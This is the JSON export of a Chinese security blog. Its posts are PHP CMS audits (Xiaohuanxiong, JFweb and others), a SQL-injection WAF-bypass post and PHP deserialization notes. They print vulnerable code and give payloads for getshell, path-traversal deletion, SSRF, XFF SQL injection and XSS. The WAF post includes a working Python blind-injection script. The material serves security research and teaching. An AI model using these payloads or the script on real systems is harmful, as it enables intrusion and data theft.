{"meta":{"title":"7_up Blog -读万卷书,行万里路","subtitle":"","description":"7_up Blog -致力于网络安全","author":"7_up","url":"http://77up.top","root":"/"},"pages":[{"title":"about","date":"2022-01-14T17:03:53.000Z","updated":"2022-01-25T15:21:41.675Z","comments":true,"path":"about/index.html","permalink":"http://77up.top/about/index.html","excerpt":"","text":"关于我是谁？ 只是一个热爱网络安全的普通人，喜欢挖src，喜欢渗透，准备专升本，学习java，会一点点的python和php哈哈哈"},{"title":"categories","date":"2022-01-14T09:25:18.000Z","updated":"2022-01-14T09:28:08.455Z","comments":true,"path":"categories/index.html","permalink":"http://77up.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-01-14T09:26:50.000Z","updated":"2022-01-14T09:27:42.406Z","comments":true,"path":"tags/index.html","permalink":"http://77up.top/tags/index.html","excerpt":"","text":""},{"title":"links","date":"2022-01-26T06:26:06.000Z","updated":"2022-01-26T06:26:06.626Z","comments":true,"path":"links/index.html","permalink":"http://77up.top/links/index.html","excerpt":"","text":""}],"posts":[{"title":"小浣熊cms审计","slug":"小浣熊cms审计","date":"2022-02-09T13:51:08.000Z","updated":"2022-02-09T13:52:04.072Z","comments":true,"path":"2022/02/09/小浣熊cms审计/","link":"","permalink":"http://77up.top/2022/02/09/%E5%B0%8F%E6%B5%A3%E7%86%8Acms%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"小浣熊cms审计(github上400多start)author:7_up 小说cms：https://gitee.com/hiliqi/novel漫画cms:https://github.com/hiliqi/xiaohuanxiong小浣熊cms： 开源有态度的CMS，分漫画版和小说版，基于thinkphp6.0开发，永久免费漏洞1：后台两个任意代码执行（漫画，小说都有该漏洞）/app/admin/controller/Friendshiplinks.php/app/admin/controller/Payment.php漏洞触发点在后台添加滴滴友链处，token参数是我们可控的， 在didi函数中，请求值不经过过滤就file_put_contents()写入PHP文件，导致代码执行注入漏洞 ,访问前台任意界面即可getshell12345678910111213141516171819202122232425262728 public function didi() &#123; if (request()-&gt;isPost()) &#123; $site_id = input(&#x27;siteid&#x27;); $token = input(&#x27;token&#x27;);//post获取参数token $code = &lt;&lt;&lt;INFO&lt;?phpreturn [ &#x27;siteid&#x27; =&gt; &#x27;&#123;$site_id&#125;&#x27;, &#x27;token&#x27; =&gt; &#x27;&#123;$token&#125;&#x27; ];INFO; $file = App::getRootPath() . &#x27;config/didi.php&#x27;; if (!file_exists($file)) &#123; return json([&#x27;err&#x27; =&gt; 1, &#x27;msg&#x27; =&gt; &#x27;配置文件不存在&#x27;]); &#125; file_put_contents($file, $token);//未经检验直接写入导致getshell return json([&#x27;err&#x27; =&gt; 0, &#x27;msg&#x27; =&gt; &#x27;修改成功&#x27;]); &#125; $site_id = config(&#x27;didi.siteid&#x27;); $token = config(&#x27;didi.token&#x27;); View::assign([ &#x27;siteid&#x27; =&gt; $site_id, &#x27;token&#x27; =&gt; $token ]); return \\view(); &#125;&#125; 漏洞2：前台任意文件删除(小说cms独有)这里文件删除需要有个条件就是需要注册个小说作者号，作者号需要管理员审核才能登陆\\app\\author\\controller\\Books.php定位到漏洞函数create()后面几个函数都有该漏洞，只审计这一个1234567891011121314151617181920212223242526272829303132333435363738public function create() &#123; if (request()-&gt;isPost()) &#123; $book = new ArticleArticle(); $data = $this-&gt;request-&gt;param(); $book-&gt;authorid = $this-&gt;uid; $book-&gt;author = $this-&gt;author_name; $book-&gt;lastupdate = time(); $book-&gt;display = 1; $str = $this-&gt;convert($data[&#x27;articlename&#x27;]); //生成标识 $c = (int)ArticleArticle::where(&#x27;backupname&#x27;,&#x27;=&#x27;,$str)-&gt;count(); if ($c &gt; 0) &#123; $data[&#x27;backupname&#x27;] = md5(time() . mt_rand(1,1000000)); //如果已经存在相同标识，则生成一个新的随机标识 &#125; else &#123; $data[&#x27;backupname&#x27;] = $str; &#125; $result = $book-&gt;save($data); if ($result) &#123; $cover = App::getRootPath() .&#x27;/public/files/&#x27;. $data[&#x27;cover&#x27;]; $bigId = floor((double)($book[&#x27;articleid&#x27;] / 1000)); $dir = App::getRootPath().&#x27;/public/files/&#x27; . sprintf(&#x27;/article/image/%s/%s/&#x27;,$bigId, $book[&#x27;articleid&#x27;]); if (!is_dir($dir)) &#123; mkdir($dir, 0777, true); &#125; $filename = App::getRootPath().&#x27;/public/files/&#x27; . sprintf(&#x27;/article/image/%s/%s/%ss.jpg&#x27;, $bigId, $book[&#x27;articleid&#x27;], $book[&#x27;articleid&#x27;]); copy($cover, $filename); unlink($cover); return json([&#x27;err&#x27; =&gt;0,&#x27;msg&#x27;=&gt;&#x27;添加成功&#x27;]); &#125; else &#123; return json([&#x27;err&#x27; =&gt;1,&#x27;msg&#x27;=&gt;&#x27;添加失败&#x27;]); &#125; &#125; $cates = Cate::select(); View::assign(&#x27;cates&#x27;, $cates); return view(); &#125; 可以看到不经过任何校验直接调用unlink函数进行文件的删除实验：我们先在站点根目录新建个test.txt,看看是否能删除掉 根据路由构造payload，打上定点 可以看到cover参数已经获取到../../test.txt 成功跳转到unlink删除函数，并成功删除,可以将install.lock删除进行重装","categories":[{"name":"php","slug":"php","permalink":"http://77up.top/categories/php/"}],"tags":[{"name":"php","slug":"php","permalink":"http://77up.top/tags/php/"}]},{"title":"JFweb审计","slug":"JFweb审计","date":"2022-02-09T02:48:28.000Z","updated":"2022-02-09T02:52:58.893Z","comments":true,"path":"2022/02/09/JFweb审计/","link":"","permalink":"http://77up.top/2022/02/09/JFweb%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"JFweb审计author:7_up 介绍基于opensns进行二次开发的中小学生信息技术学科平台 jfweb （ 开发语言为PHP5.6，基于opensns2.82（现向6.0过渡，前台仍采用Zui框架为主）基础上的二次开发系统，是水月居工作室开发的开源学生机房管理平台，可免费使用，但不授权商业使用。集成学生信息技术学科平台、学生作业管理、学生课程管理等相关功能于一体的多功能教学平台，主要应用于信息技术课堂教学中。(源码发内部群文件)软件架构软件架构说明：ZUI1.8.1+THINKPHP3.2.3+JQUERY+PHPexcel1.8+PHPword1.2该系统是由Thinkphp框架构成的，也不难审计，感觉挺简单的，无聊审计一下,发一下思路，大cms我真审计不了 大致目录结构如下: 漏洞1：前台SSRF漏洞文件位于 /Public/js.php 下 先定义一个gettype参数为js并用数组定义参数allowed_content_types,然后GET参数赋值给getfiles变量，这里这个getfiles变量可控，咋们往下看 截取后缀名赋值给fileType变量，然后进行if判断这个fileType的值是否在数组allowed_content_types变量中，存在则用readfile函数读取file参数，造成ssrf(这里后缀名限制死了，不如能任意文件读取)测试： 扫描端口，不开放则延迟两秒，以此来判断 漏洞2：sql注入问题文件出现在 /Admin/Controller/ExpressionController.class.php 这个方法用get获取name和pkg参数后,赋值给pathname进行sql查询，这里用到的框架是tp3，where注入，老生常谈了，不在讲诉 前台/Application/Exam/Controller/IndexController.class.php 也用到where注入，自己审计下漏洞3：后台任意文件写入getshell问题出现在后台创建插件处 根据路由定位到漏洞源码： /Admin/Controller/AddonsController.class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394 public function build() &#123; $data = $_POST; $data[&#x27;info&#x27;][&#x27;name&#x27;] = trim($data[&#x27;info&#x27;][&#x27;name&#x27;]); $addonFile = $this-&gt;preview(false); $addons_dir = ONETHINK_ADDON_PATH; //创建目录结构 $files = array(); $addon_dir = &quot;$addons_dir&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;/&quot;; $files[] = $addon_dir; $addon_name = &quot;&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;Addon.class.php&quot;; $files[] = &quot;&#123;$addon_dir&#125;&#123;$addon_name&#125;&quot;; if ($data[&#x27;has_config&#x27;] == 1) ;//如果有配置文件 $files[] = $addon_dir . &#x27;config.php&#x27;; if ($data[&#x27;has_outurl&#x27;]) &#123; $files[] = &quot;&#123;$addon_dir&#125;Controller/&quot;; $files[] = &quot;&#123;$addon_dir&#125;Controller/&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;Controller.class.php&quot;; $files[] = &quot;&#123;$addon_dir&#125;Model/&quot;; $files[] = &quot;&#123;$addon_dir&#125;Model/&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;Model.class.php&quot;; &#125; $custom_config = trim($data[&#x27;custom_config&#x27;]); if ($custom_config) $data[] = &quot;&#123;$addon_dir&#125;&#123;$custom_config&#125;&quot;; $custom_adminlist = trim($data[&#x27;custom_adminlist&#x27;]); if ($custom_adminlist) $data[] = &quot;&#123;$addon_dir&#125;&#123;$custom_adminlist&#125;&quot;; create_dir_or_files($files); //写文件 file_put_contents(&quot;&#123;$addon_dir&#125;&#123;$addon_name&#125;&quot;, $addonFile); if ($data[&#x27;has_outurl&#x27;]) &#123; $addonController = &lt;&lt;&lt;str&lt;?phpnamespace Addons\\\\&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;\\Controller;use Home\\Controller\\AddonsController;class &#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;Controller extends AddonsController&#123;&#125;str; file_put_contents(&quot;&#123;$addon_dir&#125;Controller/&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;Controller.class.php&quot;, $addonController); $addonModel = &lt;&lt;&lt;str&lt;?phpnamespace Addons\\\\&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;\\Model;use Think\\Model;/** * &#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;模型 */class &#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;Model extends Model&#123; public \\$model = array( &#x27;title&#x27;=&gt;&#x27;&#x27;,//新增[title]、编辑[title]、删除[title]的提示 &#x27;template_add&#x27;=&gt;&#x27;&#x27;,//自定义新增模板自定义html edit.html 会读取插件根目录的模板 &#x27;template_edit&#x27;=&gt;&#x27;&#x27;,//自定义编辑模板html &#x27;search_key&#x27;=&gt;&#x27;&#x27;,// 搜索的字段名，默认是title &#x27;extend&#x27;=&gt;1, ); public \\$_fields = array( &#x27;id&#x27;=&gt;array( &#x27;name&#x27;=&gt;&#x27;id&#x27;,//字段名 &#x27;title&#x27;=&gt;&#x27;ID&#x27;,//显示标题 &#x27;type&#x27;=&gt;&#x27;num&#x27;,//字段类型 &#x27;remark&#x27;=&gt;&#x27;&#x27;,// 备注，相当于配置里的tip &#x27;is_show&#x27;=&gt;3,// 1-始终显示 2-新增显示 3-编辑显示 0-不显示 &#x27;value&#x27;=&gt;0,//默认值 ), &#x27;title&#x27;=&gt;array( &#x27;name&#x27;=&gt;&#x27;title&#x27;, &#x27;title&#x27;=&gt;L(&#x27;_TITLE_&#x27;), &#x27;type&#x27;=&gt;&#x27;string&#x27;, &#x27;remark&#x27;=&gt;&#x27;&#x27;, &#x27;is_show&#x27;=&gt;1, &#x27;value&#x27;=&gt;0, &#x27;is_must&#x27;=&gt;1, ), );&#125;str; file_put_contents(&quot;&#123;$addon_dir&#125;Model/&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;Model.class.php&quot;, $addonModel); &#125; if ($data[&#x27;has_config&#x27;] == 1) file_put_contents(&quot;&#123;$addon_dir&#125;config.php&quot;, $data[&#x27;config&#x27;]); $this-&gt;success(L(&#x27;_CREATE_SUCCESS_&#x27;), U(&#x27;index&#x27;)); &#125; 先进行post传参赋值给data，然后经过一系列的判断然后创建你插件名的文件夹，在文件夹里面创建两个文件一个config.php和插件名Action.php,而config.php的内容是可控的,即是否需要配置处 不经过任何检测直接写入config.php,造成getshell","categories":[{"name":"php","slug":"php","permalink":"http://77up.top/categories/php/"}],"tags":[{"name":"php","slug":"php","permalink":"http://77up.top/tags/php/"}]},{"title":"一次简单的代码审计","slug":"一次简单的代码审计","date":"2022-01-26T12:57:00.000Z","updated":"2022-01-26T13:29:07.352Z","comments":true,"path":"2022/01/26/一次简单的代码审计/","link":"","permalink":"http://77up.top/2022/01/26/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"起因：（大佬勿喷哈，我是真的菜）是这样的，起因是一个同班同学接了个搭建网站的单子，问我会不会搭建，我说会，然后又说得我自己来写前后端，想了想，还是拿网上的一些cms直接搭建来的快 然后就在网上找源码的时候看到一个cms，网上搜了下还没有人审计过，比较小众的一个cms，很适合练手这是源码的一个目录结构： 开始审计之路：第一肯定是审计前台的洞啦，先审计前台的xss和sql注入改源码将GET，POST的请求统一写入了一个函数进行内容的过滤，不然就是使用intval函数取整数值来进行sql和xss的过滤 不是跟你们开玩笑，这作者是真的顶，所以get，post的方法都用了这个函数进行过滤，你用php自带的过滤函数都比他舒服把漏洞点1：前台xss漏洞文件位于/login.php,作用是提醒用户账号密码错误，虽然使用了flc_request()函数进行过滤，但xss方面只过滤了空格，单引号和script 构造payload: ?msg=&lt;svg/onload=alert(1)&gt; 进行弹窗 漏洞点2：前台sql注入本来他这样过滤法都基本前台传进来的参数都基本无sql注入了，但在用户注册的./xxx/cms.class.php中，他使用getip来获取用户的ipgetip()函数的定义，可以看到没有任何过滤 全局搜索使用getuserip函数的文件 有些地方需要审核用户登陆才行，这个要后台进行设置，我们看到注册前台用户出也使用了这个方法，追踪进去看看 追踪注册的regact.php 可以看到进行了传参，并使用了函数过滤，ip变量是获取ip然后执行一系列的逻辑判断，比如用户名和邮箱是否存在，是否验证码正确等逻辑判断落到下面这步 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?php//滑动验证if ($_SESSION[&#x27;tncode_check&#x27;]!=&#x27;ok&#x27;)&#123; $response_arr = array(&quot;status&quot; =&gt; 0,&quot;message&quot; =&gt; &#x27;验证未通过,请重新验证!&#x27;); echo json_encode($response_arr); exit;&#125;unset($_SESSION[&#x27;tncode_check&#x27;]);$sql=&quot;select * from &#123;$tablepre&#125;scuser where UserName=&#x27;&quot;.$username.&quot;&#x27;&quot;;$row = $db-&gt;get_row($sql);if (!empty($row))&#123; $response_arr = array(&quot;status&quot; =&gt; 0,&quot;message&quot; =&gt; &#x27;该帐号已经有人使用，请重新注册!&#x27;); echo json_encode($response_arr); exit;&#125;else&#123; if ($smtpoff==1)&#123; $JFM=randomchar(12); $sql=&quot;insert into &#123;$tablepre&#125;scuser (UserName,Password,LastLoginIP,LastLoginTime,LoginTimes,JFM) values(&#x27;&quot;.$username.&quot;&#x27;,&#x27;&quot;.$password.&quot;&#x27;,&#x27;&quot;.$ip.&quot;&#x27;,&#x27;&quot;.$getnow.&quot;&#x27;,0,&#x27;&quot;.$JFM.&quot;&#x27;)&quot;; $db-&gt;exec($sql); //error_log($openssl.&quot;\\r\\n&quot;, 3, dirname(__FILE__).&#x27;/cht_log.txt&#x27;); $mail = new PHPMailer(true); //建立邮件发送类 $mail-&gt;CharSet = &quot;UTF-8&quot;; //设置信息的编码类型 $mail-&gt;IsSMTP(); //使用SMTP方式发送 $mail-&gt;Host = $smtpserver; //使用邮箱服务器 $mail-&gt;SMTPAuth = true; //启用SMTP验证功能 $mail-&gt;Username = $smtpusermail; //你的服务器邮箱账号 $mail-&gt;Password = $smtppass; //邮箱密码 if ($openssl==1)&#123; $mail-&gt;SMTPSecure = &#x27;ssl&#x27;; //设置使用ssl加密方式登录鉴权 php.ini开启openssl &#125; $mail-&gt;Port = $smtpport; //邮箱服务器端口号 $mail-&gt;From = $smtpusermail; //邮件发送者email地址 $mail-&gt;FromName = $site_name; //发件人名称 $mail-&gt;AddAddress($username); //发送多人就写多行，显示为陈惠添(chenhuitian@septwolves.com) $mail-&gt;IsHTML(true); //是否使用HTML格式 $mail-&gt;Subject = $site_name.&quot;新用户确认通知&quot;;; //邮件标题 $mailbody = &quot;亲爱的&quot;.$username.&quot;,离成功注册&quot;.$site_name.&quot;就差一步了！&lt;br&gt;&lt;br&gt;请点击以下链接完成注册：&lt;br&gt;&quot;; $mailbody = $mailbody.&#x27;&lt;a href=&quot;&#x27;.$site_url.&#x27;/activeuser.php?username=&#x27;.$username.&#x27;&amp;pwd=&#x27;.$password.&#x27;&amp;JFM=&#x27;.$JFM.&#x27;&quot; target=&quot;_blank&quot;&gt;&#x27;.$site_url.&#x27;/activeuser.php?username=&#x27;.$username.&#x27;&amp;pwd=&#x27;.$password.&#x27;&lt;/a&gt;&#x27;; $mail-&gt;Body = $mailbody; //邮件内容，上面设置HTML，则可以是HTML if($mail-&gt;Send())&#123; $response_arr = array(&quot;status&quot; =&gt; 1,&quot;message&quot; =&gt; &#x27;注册资料已提交成功,请登录邮箱激活你的帐户!&#x27;); echo json_encode($response_arr); exit; &#125;else&#123; $response_arr = array(&quot;status&quot; =&gt; 0,&quot;message&quot; =&gt; &#x27;邮件服务器异常,帐号可能无法激活,请联系网站管理员!&#x27;); echo json_encode($response_arr); exit; &#125; &#125;else&#123; $sql=&quot;insert into &#123;$tablepre&#125;scuser (UserName,Password,LastLoginIP,LastLoginTime,LoginTimes,AdminType,isCheck) values(&#x27;&quot;.$username.&quot;&#x27;,&#x27;&quot;.$password.&quot;&#x27;,&#x27;&quot;.$ip.&quot;&#x27;,&#x27;&quot;.$getnow.&quot;&#x27;,0,0,1)&quot;; $db-&gt;exec($sql); $uid=$db-&gt;lastInsertId2(); $_SESSION[&quot;uid&quot;]=$uid; $_SESSION[&quot;UserName&quot;]=$username; $_SESSION[&quot;pwd&quot;]=$password; $response_arr = array(&quot;status&quot; =&gt; 2,&quot;message&quot; =&gt; &#x27;注册资料已提交成功,点击确定登录你后台!&#x27;); echo json_encode($response_arr); exit; &#125;?&gt; getuserip是无过滤的，最后使用insert来执行sql语句，XFF头是可以伪造的，所以造成sql注入 其他可疑点：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?php function creat_file($path,$name)&#123;//建立文件 $filename=$path.$name; if (file_exists($filename))&#123; echo &quot;文件已经存在，请换个文件名&quot;; &#125;else&#123; if (file_exists($path))&#123; touch($name); rename($name,$filename); echo &quot;文件建立成功 &lt;/br&gt;&quot;; &#125;else&#123; echo &quot;目录不存在，请检查&quot;; &#125; &#125; &#125; /** * 本方法用来写文件，向$path路径下$name文件写入$content内容，$bool为写入选项，值为1时 * 接着文件原内容下继续写入，值为2时写入后的文件只有本次$content内容 * * @param string_type $path * @param string_type $name * @param string_type $content * @param $bool_type $bool */ function write_file($path,$name,$content,$bool)&#123; $filename=$path.$name; if ($bool==1) &#123; if (is_writable($filename)) &#123; $handle=fopen($filename,&#x27;a&#x27;); if (!$handle) &#123; echo &quot;文件不能打开或文件不存在&quot;; exit; &#125; $result=fwrite($handle,$content); if (!$result) &#123; echo &quot;文件写入失败&quot;; &#125;else&#123; echo &quot;文件写入成功&quot;; fclose($handle); &#125; &#125;else&#123; echo &quot;文件不存在&quot;; &#125; &#125; if ($bool==2) &#123; if (!file_exists($filename)) &#123; $this-&gt;creat_file($path,$name); $handle=fopen($filename,&#x27;a&#x27;); if (fwrite($handle,$content))&#123; echo &quot;文件写入成功&quot;; &#125; &#125;else &#123; unlink($filename); $this-&gt;creat_file($path,$name); $this-&gt;write_file($path,$name,$content,1); echo &quot;文件修改成功&quot;; &#125; &#125; &#125; ?&gt; 但没有调用这两个函数的地方 (那你tm写出来干嘛？？？),后台的洞，有时间在审计，先撤了","categories":[{"name":"php","slug":"php","permalink":"http://77up.top/categories/php/"}],"tags":[{"name":"php","slug":"php","permalink":"http://77up.top/tags/php/"}]},{"title":"团队信息收集开发","slug":"团队信息收集工具开发","date":"2022-01-25T15:37:16.000Z","updated":"2022-01-25T15:49:27.644Z","comments":true,"path":"2022/01/25/团队信息收集工具开发/","link":"","permalink":"http://77up.top/2022/01/25/%E5%9B%A2%E9%98%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/","excerpt":"","text":"Qaseem信息收集工具正在开发中123###### 这几天想为团队开发一个信息收集工具，主要开发思路是调用工具和各种网络搜索引擎和api接口获取隐秘资产，主要用到爱妻查，备案查询和certs，360quake等各种接口和调用各种工具，目前正在开发中，本人不是专门干开发的，所以写的有点慢和正在调试bug，而且也没啥时间写，偶尔写一下，因为要升学考试的复习 正在开发中哈，如果有啥好想法或者想一起开发的可以联系我哈 不说了写bug去了 ps：后面我会发一篇代码审计的文章，审计的漏洞和payload我将发出来，大家可以看看思路哈哈哈，撤了","categories":[{"name":"python","slug":"python","permalink":"http://77up.top/categories/python/"}],"tags":[{"name":"日常","slug":"日常","permalink":"http://77up.top/tags/%E6%97%A5%E5%B8%B8/"}]},{"title":"sql注入绕过waf的一些姿势","slug":"sql注入绕过waf的一些姿势","date":"2022-01-14T15:57:51.000Z","updated":"2022-01-14T16:29:19.661Z","comments":true,"path":"2022/01/14/sql注入绕过waf的一些姿势/","link":"","permalink":"http://77up.top/2022/01/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF/","excerpt":"","text":"1、前言目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况绕过waf的一些常见方法 ①关键字大小写混合 ②关键字替换 ③使用编码 ④使用注释 ⑤等价的函数和命令 ⑥使用特殊符号 ⑦HTTP参数控制 ⑧缓冲区溢出 ⑨整合绕过 #1.开局一个搜索框(360_waf) tips:这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意#2.啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a%’) #3.绕过它！！这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它paylaod：2021%’)&amp;&amp;(ascii(substr(database(),1,1))&gt;97# 1可以看到这是个上传包的格式，HTTP头里的Content-Type一般有application/x-www-form-urlencoded，multipart/form-data，text/plain三种，其中multipart/form-data表示数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当waf没有规则匹配该协议传输的数据时可被绕过。 构造python脚本进行注入1234567891011121314151617181920212223import requestsfrom collections import OrderedDictheaders=&#123; &quot;Host&quot;:&quot;www.xxxx.cn&quot;, &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;, &quot;Referer&quot;:&quot;https://www.xxx.cn/search.php?keyword=233&quot;&#125;session=requests.session()result=&quot;&quot;url = &quot;https://www.xxxx.cn/search.php/test.css&quot;for i in range(1,50): for j in range(32,128): payload=&quot;2021%&#x27;)&amp;&amp;(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;.format(i,j) data=OrderedDict([(&quot;keyword&quot;, (None, payload))]) try: r=session.post(url,headers=headers,files=data) # print(r.request.body) if len(r.text)&gt;13106: result=result+chr(j) print(result) break except TimeoutError: print(&quot;注入结束&quot;) 成功注入出数据 #1.开局一个api接口(阿里云waf)ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅这里经过fuzz也得到了他过滤了空格，ascii，substr，user(),select,=,&gt;,&lt;等众多函数这里我用了等价函数的方式进行绕过总体payload为:admin’||(mid(@@user,1,1)like(“%a%”))#这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符这里也可以用hex(mid)函数来进行注入，效果一样，最后解码即可通过 SQL 函数绕过 SQL 注入 WAF 的案例研究参考链接：https://mp.weixin.qq.com/s/wf25AJssCzAz5RAwNgi33g","categories":[{"name":"web","slug":"web","permalink":"http://77up.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://77up.top/tags/web/"}]},{"title":"对于php反序列化的一些笔记","slug":"对于php反序列化的一些笔记","date":"2022-01-14T08:57:18.000Z","updated":"2022-01-14T09:54:48.063Z","comments":true,"path":"2022/01/14/对于php反序列化的一些笔记/","link":"","permalink":"http://77up.top/2022/01/14/%E5%AF%B9%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/","excerpt":"","text":"什么是PHP反序列化php序列化是指将php的对象（或者是普通的变量）转化为字符串的一个过程，目的是为了方便储存和传输数据。而反序列化就是将序列化后的字符串转化为对应的对象或普通变量的过程，下面我们来看一下php序列化和反序列化的函数 serialize()先看下php手册的说明 1serialize(mixed $value): string serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。 unserialize()1unserialize(string $str): mixed unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 来个demo 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass demo&#123; public $s = &#x27;aaaaaa&#x27;; public $i = 11111; public $arr = array(&#x27;111&#x27;,&#x27;222&#x27;); protected $pro=&#x27;it\\&#x27;s protected&#x27;; private $pri = &#x27;it\\&#x27;s private&#x27;;&#125;$demo =new demo();$a =serialize($demo);echo $a;//输出结果如下，不可见字符用\\+十六进制表示//O:4:&quot;demo&quot;:5:&#123;s:1:&quot;s&quot;;s:6:&quot;aaaaaa&quot;;s:1:&quot;i&quot;;i:11111;s:3:&quot;arr&quot;;a:2:&#123;i:0;s:3:&quot;111&quot;;i:1;s:3:&quot;222&quot;;&#125;S:6:&quot;\\00*\\00pro&quot;;s:14:&quot;it&#x27;s protected&quot;;S:9:&quot;\\00demo\\00pri&quot;;s:12:&quot;it&#x27;s private&quot;;&#125;var_dump(unserialize($a));//输出结果如下：/*class demo#2 (5) &#123; public $s =&gt; string(6) &quot;aaaaaa&quot; public $i =&gt; int(11111) public $arr =&gt; array(2) &#123; [0] =&gt; string(3) &quot;111&quot; [1] =&gt; string(3) &quot;222&quot; &#125; protected $pro =&gt; string(14) &quot;it&#x27;s protected&quot; private $pri =&gt; string(12) &quot;it&#x27;s private&quot;&#125;*/ 序列化字符串格式php在序列化后用字母表示这个变量的类型，变量类型会写在php序列化字符串的每一个子字符串的开头 下面总结了一些常见的变量类型的字母表示 变量类型 序列化后字母表示 整型 i 双精度浮点 d 布尔 b NULL N 数组 a 字符串 s/S 类 O 说明下在字符串中：s是最普通的字符串，而S可以用反斜杠+16进制来表示字符 一个php变量在序列化之后一般有以下的格式，&lt;&gt;为可嵌套部分，可以是以下任意类型的变量序列化后的字符串 整型/double型/布尔型：i/d/b:[变量值]; 字符串类：s/S:[字符串长度]:&quot;[字符串值]&quot;; NULL类型：N; 数组：a:[数组元素个数]&#123;&lt;下标(整型)或数组的键(字符串)&gt;;&lt;数组的值&gt;;&lt;下标(整型)或数组的键(字符串)&gt;;&lt;数组的值&gt;;&#125; 对象：O:[类长度]:&quot;[类名]&quot;:[属性个数]&#123;s:[属性名1长度]:&quot;[属性名1]&quot;;&lt;属性值n&gt;;...;s:[属性名n长度]:&quot;[属性名n]&quot;;&lt;属性值n&gt;;&#125; 在表示修饰对象的属性访问控制修饰符时，会在属性名这里表示 比如在属性名前面加上\\00*\\00来表示该属性被protected属性修饰 在属性名前面加上\\00[类名]\\00来表示该属性被private属性修饰 PHP魔术方法在php的类中存在的魔术方法，在一定的条件下会被自动调用，魔术方法均为双下划线开头，下面给出一些魔术方法的简单描述 方法名 用途 __construct() 构造方法，在一个类在实例化时被调用 __destruct() 析构方法，在一个对象在被销毁的时候 被调用 __toString() 在一个对象在被当作字符串使用时调用的方法，返回值必须是字符串 __invoke() 在一个对象被作为函数使用时的方法 __call() 在一个对象被调用了一个不存在的方法时调用 __callStatic() 在静态的上下文中调用不存在的方法时使用 __sleep() 在一个对象在序列化时被调用的方法，返回值为包含属性名字的数组，如果没有加会抛一个E_NOTICE级别的错误 __wakeup() 在一个对象被反序列化的时候调用 __get() 在尝试读取不可访问或不存在的对象属性时被自动调用 __set() 在尝试给不可访问或不存在的对象属性赋值时会被自动调用 在这里说明几个函数： __toString()方法这个方法将在一个对象被当作字符串使用的时候会被调用，这包括很多情况，举几个例子： 使用echo，print输出声明了__toString方法的对象时或该对象参与格式化字符串输出时 用一个字符串和声明了__toString方法的对象进行拼接 用一个字符串和一个声明了__toString方法的对象进行比较 使用处理字符串的函数处理声明了__toString方法的对象，比如md5()，addslashes()，in_array()等 123456789101112131415161718192021&lt;?phpclass test1&#123; public $a=&#x27;this is a test&#x27;; public function __toString()&#123; echo &quot;called __toString&quot;.PHP_EOL; return $this-&gt;a; &#125;&#125;$t=new test1();echo &quot;printf:&quot;.PHP_EOL;printf(&quot;output: %s\\n&quot;,$t);echo &quot;addslashes:&quot;.PHP_EOL;addslashes($t);echo &quot;md5:&quot;.PHP_EOL;md5($t);echo &quot;==:&quot;.PHP_EOL;$t==&#x27;a&#x27;;echo &quot;in_array:&quot;.PHP_EOL;in_array($t,array(&quot;114514&quot;,&quot;neko&quot;,&quot;yukinoshita&quot;,&quot;this is a test&quot;,&quot;nacho nya&quot;)); 结果： 可以看见以上函数都被调用了，其中在in_array()函数中，被调用的次数和匹配到__toString()方法的返回值相同的位置相同 __call()方法和__callStatic()方法__call方法： 1public __call(string $name, array $arguments): mixed 在对象中调用一个不可访问方法时，__call()会被调用。 12345678&lt;?phpclass test1&#123; public function __call($name,$args)&#123; echo &quot;this is an unsupported method &quot;.$name; &#125;&#125;$a = new test1();$a-&gt;neko(); __callStatic()方法： 1public static __callStatic(string $name, array $arguments): mixed 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。 12345678&lt;?phpclass test1&#123; public static function __callStatic($name,$args)&#123; echo &quot;this is an unsupported method &quot;.$name; &#125;&#125;test1::neko(); 